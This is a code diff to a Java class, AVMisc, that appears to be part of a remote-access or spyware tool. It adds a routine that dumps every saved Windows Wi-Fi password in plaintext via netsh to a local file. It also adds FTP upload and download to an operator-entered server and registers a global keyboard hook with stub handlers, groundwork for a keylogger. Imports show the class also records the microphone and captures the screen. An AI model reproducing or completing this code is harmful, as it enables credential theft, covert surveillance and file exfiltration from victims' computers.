@@ -6,15 +6,12 @@ import java.awt.Robot;
 import java.awt.Toolkit;
 import java.awt.image.BufferedImage;
 import java.io.BufferedReader;
-import java.io.BufferedWriter;
 import java.io.File;
+import java.io.FileInputStream;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
-import java.io.FileWriter;
 import java.io.IOException;
-import java.io.InputStream;
 import java.io.InputStreamReader;
-import java.io.OutputStream;
 import java.nio.file.Files;
 import java.nio.file.Paths;
 import java.time.LocalDateTime;
@@ -24,42 +21,57 @@ import java.util.List;
 import java.util.Scanner;
 import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.stream.Collectors;
-import java.util.stream.Stream;
 
 import javax.imageio.ImageIO;
-import javax.sound.sampled.AudioFormat;
 import javax.sound.sampled.AudioSystem;
 import javax.sound.sampled.Mixer.Info;
+
+import org.apache.commons.net.ftp.FTPClient;
+import org.apache.commons.net.ftp.FTPReply;
+
+import org.jnativehook.GlobalScreen;
+import org.jnativehook.NativeHookException;
+import org.jnativehook.keyboard.NativeKeyEvent;
+import org.jnativehook.keyboard.NativeKeyListener;
+
 import de.ralleytn.simple.audio.Audio;
 import de.ralleytn.simple.audio.AudioEvent;
 import de.ralleytn.simple.audio.AudioException;
 import de.ralleytn.simple.audio.Recorder;
 import de.ralleytn.simple.audio.StreamedAudio;
 
-public class AVMisc {
+public class AVMisc implements NativeKeyListener {
 	private static final DateTimeFormatter dtf = DateTimeFormatter.ofPattern("MM_dd_yy_HH_mm");
-	private static final AudioFormat format = new AudioFormat(AudioFormat.Encoding.PCM_SIGNED, 44100, 16, 1, 4, 44100, false);
+	private static final String OS = System.getProperty("os.name");
 	private long RECORD_TIME = 0;
+	private AtomicBoolean recordingAudio = new AtomicBoolean();
+	private AtomicBoolean playingAudio = new AtomicBoolean();
 	private Scanner sc;
 	private Thread recordingAudioThread;
 	private Thread playingAudioThread;
-	private AtomicBoolean recordingAudio = new AtomicBoolean();
-	private AtomicBoolean playingAudio = new AtomicBoolean();
+	private FTPClient ftp;
 	private String recordingAudioFileName;
 	private String playingAudioFileName;
 	private Audio audio;
 	private Recorder recorder;
+	private boolean KLIsPossible;
 
 	public static void main(String[] args) {
 		AVMisc av = new AVMisc();
 		av.begin();
-		// System.getProperty("os.name")
 	}
 	
 	public AVMisc() {
 		sc = new Scanner(System.in);
 		recordingAudio.set(false);
 		playingAudio.set(false);
+		try {
+			GlobalScreen.registerNativeHook();
+			KLIsPossible = true;
+		}
+		catch(NativeHookException e) {
+			KLIsPossible = false;
+		}
 	}
 	
 	// Microphone
@@ -268,53 +280,68 @@ public class AVMisc {
 	}
 	
 	/***
-	 * Get Wifi Info
+	 * Get WiFi Info
 	 */
 	private void getWifiInfo() {
-		String profiles = "";
-		try {
-			Process p = Runtime.getRuntime().exec("netsh.exe wlan show profiles");
-			BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
-			String val;
-			while((val = in.readLine()) != null) {
-				profiles += val + "\n";
-			}
-			String[] lines = profiles.split("\n");
-			List<String> ssids = Arrays.stream(lines)
-					.map(l -> l.trim())
-					.filter(l -> l.startsWith("All"))
-					.map(l -> l.substring(23))
-					.collect(Collectors.toList());
-			if(ssids.size() == 0) {
-				in.close();
-				return;
-			}
-			String data = "";
-			for (String id : ssids) {
-				String cmd = String.format("netsh.exe wlan show profiles name=\"%s\" key=clear", id);
-				p = Runtime.getRuntime().exec(cmd);
-				in = new BufferedReader(new InputStreamReader(p.getInputStream()));
-				String profile = "";
-				val = null;
+		// Wifi passwords are only available on Windows
+		if (OS.contains("Windows")) {
+			try {
+				// Execute the command to get all of the wireless profiles
+				Process p = Runtime.getRuntime().exec("netsh.exe wlan show profiles");
+				BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
+				String profiles = ""; // Data for all of the wireless profiles
+				String val; //Placeholder
 				while ((val = in.readLine()) != null) {
-					profile += val;
+					profiles += val + "\n";
 				}
-				Stream<String> line = Arrays.stream(profile.split("\n"))
+				val = null;
+				// Create a list of the SSIDs
+				List<String> ssids = Arrays.stream(profiles.split("\n"))
 						.map(l -> l.trim())
-						.filter(l -> l.startsWith("Key Content"));
-				if(line.count() > 0) {
-					data += String.format("------------------\n\nSSID: %s\nPASSKEY: %s\n\n",
-							line.map(l -> l.substring(25)).toArray()[0]);
+						.filter(l -> l.startsWith("All"))
+						.map(l -> l.substring(23))
+						.collect(Collectors.toList());
+				// Return if there are no wireless profiles
+				if (ssids.size() == 0) {
+					in.close();
+					return;
 				}
+				String data = ""; // A formatted string of all SSIDs and their passwords
+				for (String id : ssids) {
+					// Execute the command to get the connection data for each wireless profile
+					String cmd = String.format("netsh.exe wlan show profiles name=\"%s\" key=clear", id);
+					p = Runtime.getRuntime().exec(cmd);
+					in = new BufferedReader(new InputStreamReader(p.getInputStream()));
+					String profile = ""; // Data for an individual profile
+					while ((val = in.readLine()) != null) {
+						profile += val + "\n";
+					}
+					// Filter the result for each profile to find the line containing the password
+					List<String> line = Arrays.stream(profile.split("\n"))
+							.map(l -> l.trim())
+							.filter(l -> l.startsWith("Key Content"))
+							.collect(Collectors.toList());
+					// line.size() will be 0 if the wireless profile corresponds to an open network
+					if (line.size() > 0) {
+						data += String.format("------------------\n\nSSID: %s\nPASSKEY: %s\n\n", 
+								id, 
+								line.stream()
+									.map(l -> l.substring(25))
+									.findFirst().get());
+					}
+				}
+				// Write 'data' to the file if 'data' is not empty
+				if (!data.equals("")) {
+					String fileName = "wifi.txt";
+					Files.write(Paths.get(fileName), data.getBytes());
+					System.out.printf("Wifi data saved as %s\n", fileName);
+				}
+				in.close();
+				data = null;
 			}
-			String fileName = "wifi.txt";
-			BufferedWriter writer = new BufferedWriter(new FileWriter(fileName));
-			writer.write(data);
-			writer.close();
-			System.out.printf("Wifi data saved as %s\n", fileName);
-		}
-		catch (IOException e) {
-			System.out.println(e.getMessage());
+			catch (IOException e) {
+				System.out.println(e.getMessage());
+			}
 		}
 	}
 	
@@ -322,14 +349,69 @@ public class AVMisc {
 	 * Upload files
 	 */
 	private void upload() {
-		System.out.print("Enter the name of the file");
+		try {
+			if(!connectToFTPServer()) {
+				System.out.println(ftp.getReplyString());
+			}
+			// Continue if the server connection attempt was successful
+			else {
+				// Upload a file
+				System.out.print("Enter the path of the file to upload: ");
+				String filePath = sc.nextLine();
+				if(Files.exists(Paths.get(filePath))) {
+					String fileName = filePath.substring(filePath.lastIndexOf('\\')+1);
+					File file = new File(filePath);
+					FileInputStream input = new FileInputStream(file);
+					System.out.print("Enter the path to the directory on the server: ");
+					String dir = sc.nextLine();
+					if(!ftp.storeFile(dir + fileName, input)) {
+						System.out.println("There was an error writing the file to the server");
+					}
+					else {
+						System.out.println("Success");
+					}
+					input.close();
+					ftp.disconnect();
+				}
+				else { throw new FileNotFoundException(); }
+			}
+		}
+		catch(IOException e) {
+			System.out.println(e.getMessage());
+		}
 	}
 	
 	/***
 	 * Download files
 	 */
 	private void download() {
-		
+				try {
+					if(!connectToFTPServer()) {
+						System.out.println(ftp.getReplyString());
+					}
+					// Continue if the server connection attempt was successful
+					else {
+						// Download a file
+						System.out.print("Enter the path of the file on the server to download: ");
+						String remoteFilePath = sc.nextLine();
+						String fileName = remoteFilePath.substring(remoteFilePath.lastIndexOf('/')+1);
+						System.out.print("Enter the path of the directory on the local machine (with \\\\): ");
+						String localFilePath = sc.nextLine() + fileName;
+						File file = new File(localFilePath);
+						FileOutputStream output = new FileOutputStream(file);
+						if(!ftp.retrieveFile(remoteFilePath, output)) {
+							System.out.println("There was an error retrieving the file from the server");
+						}
+						else {
+							System.out.println("Success");
+						}
+						output.close();
+						ftp.disconnect();
+					}
+				}
+				catch(IOException e) {
+					System.out.println(e.getMessage());
+				}
 	}
 	
 	/***
@@ -353,4 +435,51 @@ public class AVMisc {
 		
 	}
 	
+	/********** HELPER METHODS **********/
+	private boolean connectToFTPServer() {
+		// Get the server IP
+		System.out.print("Enter the server IP address: ");
+		String ip = sc.nextLine();
+		ftp = new FTPClient();
+		try {
+			ftp.connect(ip);
+			int replyCode = ftp.getReplyCode();
+			if(!FTPReply.isPositiveCompletion(replyCode)) {
+				return false;
+			}
+			// Login if necessary
+			System.out.print("Do you need to login? (y/n): ");
+			String response = sc.nextLine();
+			if(response.toLowerCase().equals("y")) {
+				System.out.print("Enter the username: ");
+				String user = sc.nextLine();
+				System.out.print("Enter the password: ");
+				String pass = sc.nextLine();
+				return ftp.login(user, pass);
+			}
+			return true;
+			
+		}
+		catch(IOException e) {
+			System.out.println(e.getMessage());
+			return false;
+		}
+	}
+
+	@Override
+	public void nativeKeyPressed(NativeKeyEvent event) {
+		
+		
+	}
+
+	@Override
+	public void nativeKeyReleased(NativeKeyEvent event) {
+		
+		
+	}
+
+	@Override
+	public void nativeKeyTyped(NativeKeyEvent event) {
+		
+	}
 }
